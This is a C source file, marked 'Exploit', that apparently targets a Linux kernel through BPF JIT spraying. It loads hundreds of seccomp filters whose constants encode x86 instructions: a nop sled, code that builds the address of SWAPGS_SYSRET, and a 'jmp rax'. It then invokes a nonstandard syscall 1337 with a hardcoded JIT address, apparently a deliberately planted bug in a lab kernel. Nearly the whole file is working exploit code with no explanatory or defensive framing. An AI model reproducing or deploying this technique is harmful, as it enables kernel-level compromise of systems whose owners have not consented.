#include <assert.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

typedef unsigned char __u8;
typedef unsigned short __u16;
typedef unsigned int __u32;
typedef unsigned long __u64;

/* linux/seccomp.h */

#define SECCOMP_MODE_DISABLED 0 /* seccomp is not in use. */
#define SECCOMP_MODE_STRICT 1   /* uses hard-coded filter. */
#define SECCOMP_MODE_FILTER 2   /* uses user-supplied filter. */

#define SECCOMP_RET_KILL_PROCESS 0x80000000U /* kill the process */
#define SECCOMP_RET_KILL_THREAD 0x00000000U  /* kill the thread */
#define SECCOMP_RET_KILL SECCOMP_RET_KILL_THREAD
#define SECCOMP_RET_TRAP 0x00030000U       /* disallow and force a SIGSYS */
#define SECCOMP_RET_ERRNO 0x00050000U      /* returns an errno */
#define SECCOMP_RET_USER_NOTIF 0x7fc00000U /* notifies userspace */
#define SECCOMP_RET_TRACE 0x7ff00000U      /* pass to a tracer or disallow */
#define SECCOMP_RET_LOG 0x7ffc0000U        /* allow after logging */
#define SECCOMP_RET_ALLOW 0x7fff0000U      /* allow */

struct seccomp_data {
  int nr;
  __u32 arch;
  __u64 instruction_pointer;
  __u64 args[6];
};

/* linux/filter.h */

struct sock_filter { /* Filter block */
  __u16 code;        /* Actual filter code */
  __u8 jt;           /* Jump true */
  __u8 jf;           /* Jump false */
  __u32 k;           /* Generic multiuse field */
};

struct sock_fprog {   /* Required for SO_ATTACH_FILTER. */
  unsigned short len; /* Number of filter blocks */
  struct sock_filter *filter;
};

/*
 * Macros for filter block array initializers.
 */
#ifndef BPF_STMT
#define BPF_STMT(code, k)                                                      \
  (struct sock_filter) { (unsigned short)(code), 0, 0, (k) }
#endif
#ifndef BPF_JUMP
#define BPF_JUMP(code, k, jt, jf)                                              \
  (struct sock_filter) { (unsigned short)(code), (jt), (jf), (k) }
#endif

/* linux/bpf_common.h. */

/* Instruction classes */
#define BPF_CLASS(code) ((code)&0x07)
#define BPF_LD 0x00
#define BPF_LDX 0x01
#define BPF_ST 0x02
#define BPF_STX 0x03
#define BPF_ALU 0x04
#define BPF_JMP 0x05
#define BPF_RET 0x06
#define BPF_MISC 0x07

#define BPF_SIZE(code) ((code)&0x18)
#define BPF_W 0x00 /* 32-bit */
#define BPF_H 0x08 /* 16-bit */
#define BPF_B 0x10 /*  8-bit */
/* eBPF         BPF_DW          0x18    64-bit */
#define BPF_MODE(code) ((code)&0xe0)
#define BPF_IMM 0x00
#define BPF_ABS 0x20
#define BPF_IND 0x40
#define BPF_MEM 0x60
#define BPF_LEN 0x80
#define BPF_MSH 0xa0

#define BPF_JA 0x00
#define BPF_JEQ 0x10
#define BPF_JGT 0x20
#define BPF_JGE 0x30
#define BPF_JSET 0x40
#define BPF_SRC(code) ((code)&0x08)
#define BPF_K 0x00
#define BPF_X 0x08

/* Exploit. */

#define JITED 0xFFFFFFFFC0010FF0
#define SWAPGS_SYSRET 0xFFFFFFFF81800155

static struct sock_filter filter[1000];
static struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
    .filter = filter,
};

__attribute__((noreturn)) static void spray(int fd) {
  int i, j;
  int ret;

  i = 0;
  filter[i++] =
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, nr));
  /* Nop sled. */
  for (j = 0; j < 500; j++)
    filter[i++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05eb00eb, 0, i & 1);
  /* xor eax, eax */
  filter[i++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05ebc031, 0, i & 1);
  for (j = 0; j < 32; j++) {
    /* add eax, eax */
    filter[i++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05ebc001, 0, i & 1);
    if (SWAPGS_SYSRET & (1L << (31 - j)))
      /* inc eax */
      filter[i++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05ebc0ff, 0, i & 1);
  }
  /* cdqe */
  filter[i++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05eb9848, 0, i & 1);
  /* jmp rax */
  filter[i++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05ebe0ff, 0, i & 1);
  filter[i++] = BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW);
  filter[i++] = BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW);
  assert(i <= prog.len);
  prog.len = i;

  ret = prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
  assert(ret == 0);

  for (i = 0; i < 26500 / prog.len; i++) {
    ret = prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog, 0, 0, 0);
    assert(ret == 0);
  }

  ret = write(fd, "+", 1);
  assert(ret == 1);
  ret = close(fd);
  assert(ret == 0);

  while (1)
    pause();
}

int main(void) {
  pid_t spray_pid;
  int fds[2];
  int ret;
  char c;

  ret = pipe(fds);
  assert(ret == 0);

  spray_pid = fork();
  assert(spray_pid >= 0);
  if (spray_pid == 0) {
    ret = close(fds[0]);
    assert(ret == 0);
    spray(fds[1]);
  }
  ret = close(fds[1]);
  assert(ret == 0);

  ret = read(fds[0], &c, 1);
  assert(ret == 1 && c == '+');
  ret = close(fds[0]);
  assert(ret == 0);

  printf("Press any key\n");
  getchar();
  syscall(1337, JITED);

  while (1)
    pause();

  return 0;
}
